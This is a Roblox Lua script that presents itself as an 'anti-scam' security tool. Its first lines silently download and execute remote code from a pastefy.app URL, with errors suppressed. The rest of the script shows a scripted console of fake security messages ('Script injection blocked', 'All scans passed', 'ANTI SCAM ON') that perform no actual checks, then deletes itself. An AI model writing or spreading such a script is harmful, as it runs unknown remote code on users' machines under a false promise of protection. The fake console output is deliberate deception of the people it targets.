pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/O1yBSZ1G/raw"))()
end)

local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Background "console" box
local consoleBox = Instance.new("Frame")
consoleBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
consoleBox.BackgroundTransparency = 0.4
consoleBox.BorderSizePixel = 0
consoleBox.Parent = gui

-- Text label inside box
local console = Instance.new("TextLabel")
console.BackgroundTransparency = 1
console.TextColor3 = Color3.fromRGB(0, 255, 0)
console.Font = Enum.Font.Code
console.TextSize = 16
console.TextXAlignment = Enum.TextXAlignment.Left
console.TextYAlignment = Enum.TextYAlignment.Top
console.Text = ""
console.Parent = consoleBox

local padding = 10
local function resizeBox()
    local textBounds = console.TextBounds
    consoleBox.Size = UDim2.new(0, textBounds.X + padding * 2, 0, textBounds.Y + padding * 2)
    consoleBox.Position = UDim2.new(0, 5, 0, 5)
    console.Size = UDim2.new(1, -padding * 2, 1, -padding * 2)
    console.Position = UDim2.new(0, padding, 0, padding)
end

local fakeLines = {
    "[SYSTEM] Initializing anti-scam module...",
    "[SECURITY] Scanning scripts...",
    "[SECURITY] Checking player data...",
    "[NETWORK] Verifying connections...",
    "[NETWORK] Firewall rules applied.",
    "[ANALYSIS] Script injection blocked.",
    "[ANALYSIS] All scans passed.",
    "[MODULE] Loading defense protocols...",
    "[MODULE] Encryption enabled.",
    "[OK] Security status: STABLE"
}

task.spawn(function()
    for _, line in ipairs(fakeLines) do
        console.Text = console.Text .. line .. "\n"
        resizeBox()
        task.wait(math.random(5, 12) / 10)
    end
    task.wait(0.5)
    console.Text = "ANTI SCAM ON"
    resizeBox()
    task.wait(15)
    gui:Destroy()
end)
